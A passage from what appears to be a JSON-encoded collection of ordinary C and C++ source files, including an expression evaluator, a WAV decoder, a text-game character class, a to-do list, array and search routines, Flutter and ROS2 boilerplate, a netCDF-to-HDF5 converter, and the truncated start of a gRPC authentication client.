if(isdigit(x))//\u662f\u5426\u4e3a\u6570\u5b57\uff0c\u5982\u679c\u662f\uff0c\u8981\u77e5\u9053\u662f\u51e0\u4f4d\u6570\u5b57\uff0c\u4e0d\u80fd\u4e00\u4e2a\u5341\u4f4d\u6570\u5b58\u6210\u4fe9\u4e2a\u4e00\u4f4d\u6570\n        {\n            int j = i, k = 0;\n            while(j < a.length() && isdigit(a[j]))\n            {\n                k = k*10 + a[j] - '0';\n                j ++ ;\n            }\n            i = j - 1;\n            num.push(k);\n        }\n        else if(x == '(')op.push(x);//\u5de6\u62ec\u53f7\u6ca1\u5565\u7279\u522b\u7684\uff0c\u76f4\u63a5\u5b58\n        else if(x == ')')//\u53f3\u62ec\u53f7\u8868\u793a\u8981\u4f18\u5148\u8ba1\u7b97\u7684\u7ed3\u675f\u4e86\n        {\n            while(op.top() != '(')res();//\u75af\u72c2\u8ba1\u7b97\u76f4\u5230\u9047\u5230\u5de6\u62ec\u53f7\n            op.pop();//\u62ec\u53f7\u5185\u5df2\u7ecf\u7ed3\u675f\uff0c\u5f39\u51fa\u5de6\u62ec\u53f7\n        }\n        else\n        {\n            while(op.size() && op.top() != '(' && cmp[op.top()] >= cmp[x])res();//\u6bd4\u8f83\u4f18\u5148\u7ea7\uff0c\u5982\u679c\u5927\u4e8e\u7b49\u4e8e\u8981\u8fdb\u5165\u64cd\u4f5c\u6808\u7684\u4f18\u5148\u7ea7\uff0c\u5c31\u76f4\u63a5\u8ba1\u7b97\u4e00\u4e0b\n            op.push(x);//\u65e0\u8bba\u5927\u4e8e\u5c0f\u4e8e\u7b49\u4e8e\uff0c\u90fd\u6709\u628a\u8fd9\u4e2a\u64cd\u4f5c\u7b26\u5b58\u5165\n        }\n    }\n    while(op.size())res();//\u5982\u679c\u8fd8\u6709\u64cd\u4f5c\u7b26\uff0c\u7ee7\u7eed\u8ba1\u7b97\n    cout << num.top();//\u8f93\u51fa\u6570\u6808\u9876\uff0c\u8868\u793a\u7ed3\u679c\n}",
    "#include \"wav_decoder.h\"\n#include <cstdint>\n\nnamespace wav_decoder {\n\nWAVDecoderResult WAVDecoder::decode_header(uint8_t *buffer, size_t bytes_available) {\n  size_t bytes_to_skip = this->bytes_to_skip();\n  size_t bytes_to_read = this->bytes_needed();\n  this->bytes_processed_ = 0;\n\n  while ((bytes_to_skip + bytes_to_read) > 0) {\n    if ((bytes_to_skip > bytes_available) || (bytes_to_read > bytes_available)) {\n      return WAV_DECODER_WARNING_INCOMPLETE_DATA;\n    }\n\n    if (bytes_to_skip > 0) {\n      // Adjust pointer to skip the appropriate bytes\n      buffer += bytes_to_skip;\n      this->bytes_processed_ += bytes_to_skip;\n\n      bytes_available -= bytes_to_skip;\n      bytes_to_skip = 0;\n    } else if (bytes_to_read > 0) {\n      WAVDecoderResult result = this->next(buffer);\n      buffer += bytes_to_read;\n      this->bytes_processed_ += bytes_to_read;\n\n      bytes_available -= bytes_to_read;\n\n      if (result == WAV_DECODER_SUCCESS_IN_DATA) {\n        return result;\n      } else if (result == WAV_DECODER_SUCCESS_NEXT) {\n        // Continue parsing header\n        bytes_to_skip = this->bytes_to_skip();\n        bytes_to_read = this->bytes_needed();\n      } else {\n        // Unexpected error parsing the wav header\n        return result;\n      }\n    }\n  }\n\n  return WAV_DECODER_ERROR_FAILED;\n}\n\nWAVDecoderResult WAVDecoder::next(uint8_t *buffer) {\n  this->bytes_to_skip_ = 0;\n\n  switch (this->state_) {\n    case WAV_DECODER_BEFORE_RIFF: {\n      this->chunk_name_ = std::string((const char *) buffer, 4);\n      if (this->chunk_name_ != \"RIFF\") {\n        return WAV_DECODER_ERROR_NO_RIFF;\n      }\n\n      this->chunk_bytes_left_ = *((uint32_t *) (buffer + 4));\n      if ((this->chunk_bytes_left_ % 2) != 0) {\n        // Pad byte\n        this->chunk_bytes_left_++;\n      }\n\n      // WAVE sub-chunk header should follow\n      this->state_ = WAV_DECODER_BEFORE_WAVE;\n      this->bytes_needed_ = 4;  // WAVE\n      break;\n    }\n\n    case WAV_DECODER_BEFORE_WAVE: {\n      this->chunk_name_ = std::string((const char *) buffer, 4);\n      if (this->chunk_name_ != \"WAVE\") {\n        return WAV_DECODER_ERROR_NO_WAVE;\n      }\n\n      // Next chunk header\n      this->state_ = WAV_DECODER_BEFORE_FMT;\n      this->bytes_needed_ = 8;  // chunk name + size\n      break;\n    }\n\n    case WAV_DECODER_BEFORE_FMT: {\n      this->chunk_name_ = std::string((const char *) buffer, 4);\n      this->chunk_bytes_left_ = *((uint32_t *) (buffer + 4));\n      if ((this->chunk_bytes_left_ % 2) != 0) {\n        // Pad byte\n        this->chunk_bytes_left_++;\n      }\n\n      if (this->chunk_name_ == \"fmt \") {\n        // Read rest of fmt chunk\n        this->state_ = WAV_DECODER_IN_FMT;\n        this->bytes_needed_ = this->chunk_bytes_left_;\n      } else {\n        // Skip over chunk\n        this->bytes_to_skip_ = this->chunk_bytes_left_;\n        this->bytes_needed_ = 8;\n      }\n      break;\n    }\n\n    case WAV_DECODER_IN_FMT: {\n      /**\n       * audio format (uint16_t)\n       * number of channels (uint16_t)\n       * sample rate (uint32_t)\n       * bytes per second (uint32_t)\n       * block align (uint16_t)\n       * bits per sample (uint16_t)\n       * [rest of format chunk]\n       */\n      this->num_channels_ = *((uint16_t *) (buffer + 2));\n      this->sample_rate_ = *((uint32_t *) (buffer + 4));\n      this->bits_per_sample_ = *((uint16_t *) (buffer + 14));\n\n      // Next chunk\n      this->state_ = WAV_DECODER_BEFORE_DATA;\n      this->bytes_needed_ = 8;  // chunk name + size\n      break;\n    }\n\n    case WAV_DECODER_BEFORE_DATA: {\n      this->chunk_name_ = std::string((const char *) buffer, 4);\n      this->chunk_bytes_left_ = *((uint32_t *) (buffer + 4));\n      if ((this->chunk_bytes_left_ % 2) != 0) {\n        // Pad byte\n        this->chunk_bytes_left_++;\n      }\n\n      if (this->chunk_name_ == \"data\") {\n        // Complete\n        this->state_ = WAV_DECODER_IN_DATA;\n        this->bytes_needed_ = 0;\n        return WAV_DECODER_SUCCESS_IN_DATA;\n      }\n\n      // Skip over chunk\n      this->bytes_to_skip_ = this->chunk_bytes_left_;\n      this->bytes_needed_ = 8;\n      break;\n    }\n\n    case WAV_DECODER_IN_DATA: {\n      return WAV_DECODER_SUCCESS_IN_DATA;\n      break;\n    }\n  }\n\n  return WAV_DECODER_SUCCESS_NEXT;\n}\n\nvoid WAVDecoder::reset() {\n  this->state_ = WAV_DECODER_BEFORE_RIFF;\n  this->bytes_to_skip_ = 0;\n  this->chunk_name_ = \"\";\n  this->chunk_bytes_left_ = 0;\n\n  this->sample_rate_ = 0;\n  this->num_channels_ = 0;\n  this->bits_per_sample_ = 0;\n}\n\n}  // namespace wav_decoder\n",
    "#include <iostream> //Allows for inputs and outputs\n#include <string> //Allows for string manipulation\n#include <map> //Include header file for map container\n#include <vector> //Allows for working with dynamic arrays (vectors)\n#include <fstream> //Allows for file input and output operatons\n#include <sstream> //Allows for string stream operations\n#include \"Item.h\" //Includes the header file for \"Item.h\"\n#include \"Room.h\" //Includes the header file for \"Room.h\"\n#include \"Character.h\" //Includes the header file for \"Character.h\"\n\n\n//Character class\n\n\n//New features are hitpoints and experience\nCharacter::Character(std::string& name, int health, int hitpoints, int experience) : name(name), health(health), hitpoints(hitpoints), experience(experience) {}\n/*\nConstructor for Character class, intitializes member variables name, health, hitpoints and experience with values passed as name, health, hitpoints and experience\n*/\nvoid Character::PrintStats() { //A function to output the player stats\n\tstd::cout << \"\\nYou have a health of \" << health << \" and a shield health of \" << hitpoints << \" and a level of \" << experience / 20 + 1 << \" with an XP of \" << experience << \".\\n\" << std::endl;\n\t//Outputs the players stats\n}\nvoid Character::TakeDamage(int damage) { //New feeature: A function to idecrease health on player\n\thealth = health - damage; //Minuses the players health\n\tif (health > 0) { //Checks if player health is greater than 0\n\t\tstd::cout << \"\\nYou have taken \" << damage << \" damage. Your health is: \" << health << std::endl;\n\t\t//Outputs a message saying the damage to the player done and current health\n\t}\n\telse {\n\t\thealth = 0; //Sets health to 0\n\t\tstd::cout << \"\\nYou died! Better luck next time.\" << std::endl; //Outputs a message to the player saying that they have died\n\t\tstd::exit(0); //Exits the game\n\t}\n}\nvoid Character::RegainHealth(int regeneration) { //New feeature: A function to increase health on player\n\thealth = health + regeneration; //Adds the players health\n\tif (health <= 100) { //Checks if health is less than 100\n\t\tstd::cout << \"\\nYou have recovered \" << regeneration << \" health. Your health is: \" << health << std::endl;\n\t\t//Outputs a message saying the health recovered and current health\n\t}\n\telse {\n\t\thealth = 100; //Sets health to 100\n\t\tstd::cout << \"\\nYou are at max health of 100.\" << std::endl; //Outputs a message to the player saying that they are at max health\n\t}\n}\nvoid Character::Shield_System(int shield_points) { //New feature: A function to increase/decrease health on player shield\n\thitpoints = hitpoints + shield_points; //Changes the hitpoint count for the player\n\tif (hitpoints < 0) { //Checks if hitpoints is less than 100\n\t\thitpoints = 0; //hitpoints is set to 0\n\t\tstd::cout << \"\\nYou have 0 health left on your shield.\" << std::endl; //Outputs a message saying there is min. 0 hitpoints on the shield\n\t}\n\telse if (hitpoints > 100) { //Checks if hitpoints is less than 100\n\t\thitpoints = 100; //hitpoints is set to 100\n\t\tstd::cout << \"\\nYou are at max hitpoints of 100 on your shield.\" << std::endl; //Outputs a message saying there is max. 100 hitpoints on the shield\n\t}\n\telse {\n\t\tstd::cout << \"\\nYou have: \" << hitpoints << \" hitpoints on your shield.\" << std::endl; //Outputs a message of the number of hitpoints on the player shield\n\t}\n}\nvoid Character::ExperiencePoints(int experience_points) { //New feature: \n\texperience = experience + experience_points;\n\tstd::cout << \"\\n\" << experience_points << \" points added!\" << std::endl;\n\tstd::cout << \"You are at Level: \" << 1 + experience / 20 << \" with a total XP of: \" << experience << std::endl;\n}\nvoid Character::AddToInventory(Item& newItem) { //New feature: Max amount of item to add in player inventory through function\n\tif (inventory.size() < 2) { //Checks if the size of the inventory is less than 2\n\t\tinventory.emplace_back(newItem); //Adds the new item\n\t\tstd::cout << \"\\nAmount of items in inventory: \" << inventory.size() << \"\\n\" << std::endl;\n\t\t//Outputs the amount of items in inventory\n\t}\n\telse {\n\t\tstd::cout << \"\\nAmount of items in inventory: \" << inventory.size() << \"\\n\" << std::endl;\n\t\t//Outputs the amount of items in inventory\n\t\tstd::cout << \"\\nYou have reached the maximum amount of items (which is 2) in your inventory and cannot add anymore items.\\n\" << std::endl;\n\t\t//Outputs a message saying max. items are 2\n\t}\n}\nvoid Character::RemoveFromInventory(Item& item) { //New feature: A function to remove items from the player inventory\n\tfor (unsigned int i = 0; i < inventory.size(); i++) { //Parses through the inventory\n\t\tif (this->inventory[i] == item) { //Checks if this is the item to remove from the players inventory\n\t\t\tinventory.erase(inventory.begin() + i); //Removes the item from the player inventory\n\t\t}\n\t}\n}\nstd::string& Character::GetName() { //A function to get the name of the player\n\treturn name; //Returns the name of the player\n}\nstd::vector<Item>& Character::GetInventory() { //A function to get the players inventory\n\treturn inventory; //Returns ",
    "#include \"header.h\"\r\n#include <iostream>\r\n\r\n\r\n\r\n// Constructor to initialize an empty to-do list\r\nTodoList::TodoList() : head(nullptr) {}\r\n\r\n/* \u0627\u062d\u0646\u0627 \u0647\u0646\u0627 \u0639\u0645\u0644\u0646\u0627 newtask \u0648\u0627\u0644\u0644\u064a \u0647\u064a \u0628\u062a\u0645\u062b\u0644 \u0641\u064a \u0627\u0644list \u0627\u0644newnode\r\n\u0648 \u0627\u0644 data \u0628\u062a\u0627\u0639\u062a\u0647\u0627 \u0647\u0646\u0627 \u0647\u064a \u0627\u0644 string\r\n\u0648\u0644\u0645\u0627 \u0628\u0646\u0636\u064a\u0641 \u0628\u0646\u0636\u064a\u0641 \u0645\u0646 \u0627\u0648\u0644 \u0627\u0644list\r\n*/\r\n\r\n\r\n// Function to add a task to the to-do list\r\nvoid TodoList::addTask(const string& description) {\r\n    Task* newTask = new Task;\r\n    newTask->description = description;\r\n    newTask->done = false;\r\n    newTask->next = head;\r\n    head = newTask;\r\n    k++;\r\n    cout << \"Task added successfully.\\n==========\\n\";\r\n}\r\n\r\n// Function to remove a task from the to-do list\r\nvoid TodoList::removeTask(const string& description) {\r\n    Task* current = head;\r\n    Task* prev = nullptr;\r\n    while (current != nullptr) {\r\n        if (current->description == description) {\r\n            if (prev == nullptr) {\r\n                head = current->next;\r\n            } else {\r\n                prev->next = current->next;\r\n            }\r\n            delete current;\r\n            cout << \"Task removed successfully.\\n==========\\n\" << endl;\r\n            return;\r\n        }\r\n        prev = current;\r\n        current = current->next;\r\n    }\r\n    cout << \"Task not found.\\n==========\\n\" << endl;\r\n}\r\n\r\n// Function to display the to-do list\r\nvoid TodoList::displayTodoList() {\r\n    Task* current = head;\r\n    if (current == nullptr) {\r\n        cout << \"Todo list is empty.\\n==========\\n\" << endl;\r\n        return;\r\n    }\r\n    cout << \"To-Do List:\" << endl;\r\n    while (current != nullptr) {\r\n        cout << \"- \" << current->description;\r\n        if (current->done) {\r\n            cout << \" (DONE)\";\r\n        }\r\n        cout << endl;\r\n        current = current->next;\r\n    }\r\n}\r\n\r\n// Function to mark a task as done\r\nvoid TodoList::markTaskDone(const string& description) {\r\n    Task* current = head;\r\n    while (current != nullptr) {\r\n        if (current->description == description) {\r\n            current->done = true;\r\n            cout << \"Task marked as done.\\n==========\\n\" << endl;\r\n            return;\r\n        }\r\n        current = current->next;\r\n    }\r\n    cout << \"Task not found.\\n==========\\n\" << endl;\r\n}\r\n\r\n// Function to check if a task is done\r\nbool TodoList::isTaskDone(const string& description) {\r\n    Task* current = head;\r\n    while (current != nullptr) {\r\n        if (current->description == description) {\r\n            return current->done;\r\n        }\r\n        current = current->next;\r\n    }\r\n    return false;\r\n}\r\nvoid TodoList::getTaskDn(){\r\nTask*current=head;\r\nint c=0;\r\nif(current==nullptr)\r\n    cout<<\"there is not any task is done.\\n==========\\n\";\r\nwhile(current!=nullptr)\r\n{  if(current->done){\r\ncout<< current->description<<\"  \";\r\nc++;\r\n}\r\n\r\n     current = current->next;\r\n} if(c==0)\r\n    cout<<\"there is not any task is done.\\n==========\\n\";\r\n\r\n\r\n} void TodoList::getcount()\r\n{ cout<<k<<\" \";\r\n\r\n}\r\n\r\n// Destructor to free memory allocated for tasks\r\nTodoList::~TodoList() {\r\n    while (head != nullptr) {\r\n        Task* temp = head;\r\n        head = head->next;\r\n        delete temp;\r\n    }\r\n}\r\n\r\n",
    "#include<iostream>\r\n#include<vector>\r\n#include<algorithm>\r\nusing namespace std;\r\n\r\n\r\nvoid merge(vector<int>& nums1, int m, vector<int>& nums2, int n) \r\n{\r\n    int i= m-1;\r\n    int j = n-1;\r\n    int k= (m+n)-1;\r\n\r\n    while(i>=0 && j>=0)\r\n    {\r\n        if(nums1[i]>=nums2[j])\r\n        {\r\n            nums1[k]=nums1[i];\r\n            i--;\r\n            k--;\r\n        }\r\n        else\r\n        {\r\n            nums1[k]= nums2[j];\r\n            j--;\r\n            k--;\r\n        }\r\n    }\r\n\r\n    while(j>=0)\r\n    {\r\n        nums1[k]= nums2[j];\r\n        j--;\r\n        k--;\r\n    }\r\n\r\n    while(i>=0) //Redundant Step\r\n    {\r\n        nums1[k]= nums1[i];\r\n        i--;\r\n        k--;\r\n    }\r\n    \r\n \r\n}\r\n\r\nint main()\r\n{\r\n    int m, n;\r\n\r\n    cout<<endl;\r\n    cout<<\"Number of Elements in Array 1: \";\r\n    cin>>m;\r\n    cout<<\"Number of Elements in Array 2: \";\r\n    cin>>n;\r\n\r\n    int t=m+n;\r\n\r\n    cout<<endl;\r\n\r\n    cout<<\"The Total Size of Array 1: \"<<t<<endl;\r\n    cout<<\"The Size of Array 2 would be same as Number of Elements: \"<<n<<endl;\r\n    \r\n\r\n    vector<int>nums1(t);\r\n    cout<<endl;\r\n    cout<<\"---NOTE: End 0's are place for merge elements Hence, should be Ignored---\"<<endl;\r\n\r\n    cout<<endl<<\"Enter the Array 1: \";\r\n    for(int i=0;i<t;i++)\r\n    {\r\n        cin>>nums1[i];\r\n    }\r\n\r\n\r\n    vector<int>nums2(n);\r\n    cout<<\"Enter the Array 2: \";\r\n    for(int i=0;i<n;i++)\r\n    {\r\n        cin>>nums2[i];\r\n    }\r\n    \r\n    cout<<endl<<\"The Merged Array is: \";\r\n    merge(nums1, m, nums2, n);\r\n\r\n    for(int i=0; i<t;i++)\r\n    {\r\n        cout<<nums1[i]<<\" \";\r\n    }\r\n    cout<<endl; \r\n    \r\n    \r\n    return 0;\r\n    \r\n}\r\n\r\n\r\n",
    "// C Program to implement binary search using iteration\n#include <stdio.h>\n\nint binarySearch(int arr[], int left, int right, int key) {\n\n    // Loop will run till left > right. It means that there\n      // are no elements to consider in the given subarray\n    while (left <= right) {\n\n        // calculating mid point\n        int mid = left + (right - left) / 2;\n\n        // Check if key is present at mid\n        if (arr[mid] == key) {\n            return mid;\n        }\n\n        // If key greater than arr[mid], ignore left half\n        if (arr[mid] < key) {\n            left = mid + 1;\n        }\n\n        // If key is smaller than or equal to arr[mid],\n        // ignore right half\n        else {\n            right = mid - 1;\n        }\n    }\n\n    // If we reach here, then element was not present\n    return -1;\n}\n\n\nint main() {\n    int arr[] = { 2, 5, 8, 12, 16, 23, 38, 56, 72, 91 };\n    int size = sizeof(arr) / sizeof(arr[0]);\n\n    // Element to be searched\n    int key = 23;\n\n    int result = binarySearch(arr, 0, size - 1, key);\n    if (result == -1) {\n        printf(\"Element is not present in array\");\n    }\n    else {\n        printf(\"Element is present at index %d\", result);\n    }\n    return 0;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"favorite_places\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <rclcpp/rclcpp.hpp>\n#include <sensor_msgs/msg/joint_state.hpp>\n\nclass JointStateListener : public rclcpp::Node {\npublic:\n    rclcpp::Subscription<sensor_msgs::msg::JointState>::SharedPtr subscription_;\n    bool message_received_;\n\n    JointStateListener() : Node(\"joint_state_listener\")\n     {\n        // subscriber al topic \"joint_states\"\n        subscription_ = this->create_subscription<sensor_msgs::msg::JointState>(\"joint_states\", 10, std::bind(&JointStateListener::topic_callback, this, std::placeholders::_1));\n\n        // Inizializza il flag\n        message_received_ = false;\n    }\n\n    void wait_for_message() \n    {\n        // Aspetta che venga ricevuto un messaggio\n        while (rclcpp::ok() && !message_received_) \n        {\n            rclcpp::spin_some(this->get_node_base_interface());\n            std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Attesa breve\n        }\n    }\n\nprivate:\n    void topic_callback(const sensor_msgs::msg::JointState::SharedPtr msg)\n     {\n        // Stampa il messaggio ricevuto\n        RCLCPP_INFO(this->get_logger(), \"Received joint states:\");\n        for (size_t i = 0; i < msg->name.size(); ++i) \n        {\n            RCLCPP_INFO(this->get_logger(), \"Joint: %s, Position: %f\",msg->name[i].c_str(), msg->position[i]);\n        }\n\n        // Imposta il flag per indicare che il messaggio \u00e8 stato ricevuto\n        message_received_ = true;\n     }\n};\n\nint main(int argc, char * argv[])\n{\n    rclcpp::init(argc, argv);\n    auto listener = std::make_shared<JointStateListener>();\n\n    // Aspetta di ricevere un messaggio\n    listener->wait_for_message();\n\n    rclcpp::shutdown();\n    return 0;\n}",
    "#include <iostream>\n#include <string>\n#include <numeric>\n#include <chrono>\n#include <netcdf.h>\n#include <assert.h>\n#include <mpi.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <adios2.h>\n#include \"../raster.h\"\n#define ERR do{if (status != NC_NOERR){ fprintf(stderr, \"Error: at line %d, %s\\n\", __LINE__, nc_strerror(status)); exit(status);} } while(0);\nusing namespace std::chrono;\n\n#define DIM1_NCHUNKS 20\n#define DIM2_NCHUNKS 20\n\nint main(int argc, char **argv)\n{\n    MPI_Init(&argc, &argv);\n    int rank, size;\n    if(argc <= 4)\n    {\n        std::cerr << \"Usage: ./convert <INPUT_FILENAME> <OUTPUT_FILENAME> <MASKNAME> <VARNAME> <SCLAING_FACTOR>\\n\";\n        std::cerr << \" It writes VARNAME in INPUT_FILE to OUTPUT_FILE, according to MASK\\n\";\n        return 1;\n    };\n    std::string infile = argv[1], outfile = argv[2], mask = argv[3], varname = argv[4];\n    int status, ncid, varid, ndims, vartype, dimids[5], scaling_factor = std::atoi(argv[5]);\n    size_t dimlens[5], chunksize[5];\n    char* dimnames[5] = {(char*)\"x\", (char*)\"y\", (char*)\"z\", (char*)\"w\", (char*)\"h\"};\n    MPI_Comm_rank(MPI_COMM_WORLD, &rank);\n    MPI_Comm_size(MPI_COMM_WORLD, &size);\n\n    // read mask\n    status = nc_open(infile.c_str(), NC_NETCDF4 | NC_NOWRITE, &ncid);\n    status = nc_inq_varid(ncid, mask.c_str(), &varid); ERR;\n    status = nc_inq_varndims(ncid, varid, &ndims); ERR;\n    status = nc_inq_vardimid(ncid, varid, dimids); ERR;\n    status = nc_inq_vartype(ncid, varid, &vartype); ERR;\n    for (int i = 0; i < ndims; i++)\n        status = nc_inq_dimlen(ncid, dimids[i], &dimlens[i]);\n    size_t masksize = std::accumulate(&dimlens[0], &dimlens[ndims], 1, [](size_t a, size_t b){ return a * b; });\n    int* maskbuffer = new int[masksize];\n    status = nc_get_var(ncid, varid, maskbuffer); ERR;\n    if (vartype == NC_FLOAT)\n    {\n        for (int i = 0; i < masksize; i++)\n            maskbuffer[i] = int(*((float*)(maskbuffer + i)));\n    }\n    if (rank == 0)\n        printf(\"Mask dim: %d, mask shape = ( %ld %ld ), total = %ld\\n\", ndims, dimlens[ndims-2], dimlens[ndims-1], masksize);\n\n    // read data\n    status = nc_inq_varid(ncid, varname.c_str(), &varid); ERR;\n    status = nc_inq_varndims(ncid, varid, &ndims); ERR;\n    status = nc_inq_vardimid(ncid, varid, dimids); ERR;\n    for (int i = 0; i < ndims; i++)\n        status = nc_inq_dimlen(ncid, dimids[i], &dimlens[i]);\n    size_t bufsize = std::accumulate(&dimlens[0], &dimlens[ndims], 1, [](size_t a, size_t b){ return a * b; });\n    // scale the data\n    bufsize *= scaling_factor;\n    dimlens[0] *= scaling_factor;\n    float* buffer = new float[bufsize];\n    // read data\n    status = nc_get_var_float(ncid, varid, buffer); ERR;\n    status = nc_close(ncid); ERR;\n    if (rank == 0)\n    {\n        printf(\"Data dim: %d, data shape = ( \", ndims);\n        for (int i = 0; i < ndims; i++) printf(\"%ld \", dimlens[i]);\n            printf(\"), total = %ld\\n\", bufsize);        \n    }\n    MPI_Barrier(MPI_COMM_WORLD);\n\n    adios2::ADIOS adios;\n    adios2::IO hdf5IO = adios.DeclareIO(\"WriteHDF5\");\n    hdf5IO.SetEngine(\"HDF5\");\n    hdf5IO.SetParameter(\"IdleH5Writer\",\n                            \"true\"); // set this if not all ranks are writting\n\n    adios2::Variable<int> mask_var = hdf5IO.DefineVariable<int>((mask).c_str(), std::vector<size_t>(dimlens+ndims-2, dimlens+ndims), {0, 0}, std::vector<size_t>(dimlens+ndims-2, dimlens+ndims), adios2::ConstantDims);\n\n    std::string of_adios = outfile.substr(0, outfile.length() - 3) + \"_adios_\" + std::to_string(rank) + \".nc\"; \n    // std::string cmd = \"cp \" + ofn2 + \" \" + of_adios;\n    // system(cmd.c_str());\n    adios2::Engine h5Writer = hdf5IO.Open(of_adios, adios2::Mode::Write);\n    h5Writer.Put<int>(mask_var, maskbuffer);\n\n    adios2::Variable<float> var_var = hdf5IO.DefineVariable<float>((varname).c_str(), std::vector<size_t>(dimlens, dimlens+ndims), {0, 0, 0, 0}, std::vector<size_t>(dimlens, dimlens+ndims), adios2::ConstantDims);\n\n    MPI_Barrier(MPI_COMM_WORLD);\n    auto t5 = high_resolution_clock::now();\n    h5Writer.Put<float>(var_var, buffer);\n    h5Writer.Close();\n    auto fd2 = open(of_adios.c_str(), O_RDONLY);\n    fsync(fd2);\n    close(fd2);\n    auto t6 = high_resolution_clock::now();\n    printf(\"Time_adios2=%fs\\n\", duration_cast<microseconds>(t6 - t5).count() / 1000000.0);\n\n    MPI_Barrier(MPI_COMM_WORLD);\n\n    delete[] buffer;\n    delete[] maskbuffer;\n    MPI_Finalize();\n    return status;\n}",
    "#include <iostream>\r\n#include <memory>\r\n#include <string>\r\n#include <thread>\r\n#include <future>\r\n#include \"equations.h\"\r\n#include <grpcpp/grpcpp.h>\r\n#include \"auth.grpc.pb.h\" // Include the generated header file\r\n\r\n// Using the generated namespace from the proto file\r\n\r\nusing grpc::Channel;\r\nusing grpc::ClientContext;\r\nusing grpc::Status;\r\nusing Authenticator::Auth;\r\nusing Authenticator::Answer;\r\nusing Authenticator::Variables;\r\n\r\nbool Connected = false;\r\n\r\nclass AuthClient {\r\npublic:\r\n    AuthClient(std::shared_ptr<Channel> channel) : stub_(Auth::NewStub(channel)) {}\r\n\r\n    Variables ClientVerification(double answer_value) {\r\n        Answer request;\r\n        request.set_answer(answer_value);  // Set your request data\r\n\r\n        Variables response;\r\n        ClientContext context;\r\n        Status status;\r\n        // Call the method\r\n        status = stub_->ClientVerification(&context, request, &response);\r\n\r\n        if (status.ok()) {\r\n            Connected = true;\r\n            return response;  // Return the response if successful\r\n        } else {\r\n            std::cerr << \"gRPC call failed: \" << status.error_code() << \": \" << status.error_message() << std::endl;\r\n            return Variables();  // Return a default response on failure\r\n        }\r\n    }\r\n\r\n    INT32 ServerToClientPortStream(double answer_value) {\r\n        Answer request;\r\n        Variables var;\r\n\r\n        request.set_answer(answer_value);  // Set your request data\r\n\r\n        ClientContext context;\r\n        std::unique_ptr<grpc::ClientReader<Variables>> reader(\r\n            stub_->ServerToClientPortStream(&context, request));\r\n\r\n        \r\n        std::string EquationContext;\r\n\r\n        do {\r\n            reader->Read(&var);\r\n            EquationContext = var.servercontext();\r\n            std::cout << \"not done\" << std::endl;\r\n        } while (EquationContext == \"00000\");\r\n        double Answer = calcAnswer(var.a(), var.b(), var.c(), var.x(), EquationContext.c_str());\r\n        int port = (int)Answer % 65535;\r\n        Status status = reader->Finish();\r\n        if (!status.ok()) {\r\n            std::cerr << \"RPC failed: \" << status.error_code() << \": \" << status.error_message() << std::endl;\r\n        }\r\n        return port;\r\n        // Check the status of the RPC\r\n    }\r\n\r\nprivate:\r\n    std::unique_ptr<Auth::Stub> stub_;\r\n};\r\n\r\nint RunGrpcCallInThread(AuthClient& client, double answer_value) {\r\n    // std::promise and std::future for capturing the value\r\n    std::promise<int> result_promise;\r\n    std::future<int> result_future = result_promise.get_future();\r\n\r\n    // Launch the gRPC stream in a separate thread\r\n    std::thread grpc_thread([&client, answer_value, &result_promise]() {\r\n        // Call the function and store the result in the promise\r\n        int result = client.ServerToClientPortStream(answer_value);\r\n        result_promise.set_value(result);\r\n        });\r\n\r\n    // Detach the thread to run independently\r\n    grpc_thread.detach();\r\n\r\n    // Return the future so that the caller can get the value once available\r\n    return result_future.get();  // Block until result is available\r\n}\r\n\r\nint main(int argc, char** argv) {\r\n    AuthClient 